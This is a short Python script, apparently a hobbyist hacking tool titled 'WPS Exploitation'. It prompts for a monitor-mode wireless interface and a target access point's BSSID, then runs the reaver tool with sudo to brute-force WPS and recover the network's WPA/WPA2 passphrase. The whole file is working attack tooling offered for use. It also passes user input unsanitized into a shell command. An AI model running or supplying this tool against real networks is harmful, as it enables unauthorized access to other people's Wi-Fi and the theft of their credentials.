#!/usr/bin/env python3

import os
import subprocess
from colorama import Fore, Style, init
import pyfiglet

# Initialize colorama
init(autoreset=True)

# Function to display banner
def display_banner():
    banner = pyfiglet.figlet_format("WPS Exploitation")
    print(Fore.CYAN + banner)
    print(Fore.YELLOW + "Created by Muhammad Usama")
    print("=" * 50)

# Function to execute a shell command and display output
def execute_command(description, command):
    print(Fore.GREEN + f"[*] {description}")
    confirm = input(Fore.CYAN + "[?] Proceed? (y/n): ").strip().lower()
    if confirm == "y":
        print(Fore.YELLOW + f"[*] Running: {command}\n")
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for line in iter(process.stdout.readline, ''):
                print(Fore.CYAN + line, end="")
            for line in iter(process.stderr.readline, ''):
                print(Fore.RED + line, end="")
            process.wait()
            if process.returncode == 0:
                print(Fore.GREEN + f"\n[+] {description} completed successfully.")
            else:
                print(Fore.RED + f"\n[!] {description} failed. Check the output above for details.")
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")
    else:
        print(Fore.RED + "[!] Skipped.\n")

# Function to exploit WPS using reaver
def exploit_wps(interface, bssid):
    """
    Exploit WPS using reaver to retrieve the WPA/WPA2 passphrase.
    """
    if not interface or not bssid:
        print(Fore.RED + "[!] Invalid interface or BSSID. Please try again.")
        return

    command = f"sudo reaver -i {interface} -b {bssid} -vv"
    execute_command(f"Exploiting WPS on BSSID {bssid}", command)

# Main function
def main():
    display_banner()

    interface = input(Fore.CYAN + "[?] Enter your wireless interface in monitor mode (e.g., wlan0mon): ").strip()
    bssid = input(Fore.CYAN + "[?] Enter the BSSID of the target AP: ").strip()

    exploit_wps(interface, bssid)

if __name__ == "__main__":
    main()
